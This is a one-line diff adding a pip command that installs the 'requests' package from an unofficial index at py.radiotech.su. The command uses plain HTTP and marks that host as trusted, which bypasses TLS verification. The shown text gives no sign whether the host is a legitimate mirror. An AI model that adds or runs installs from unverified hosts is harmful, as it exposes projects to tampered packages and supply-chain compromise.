@@ -1,0 +1,1 @@
+pip install --trusted-host py.radiotech.su --index-url http://py.radiotech.su/root/pypi/+simple/ requests
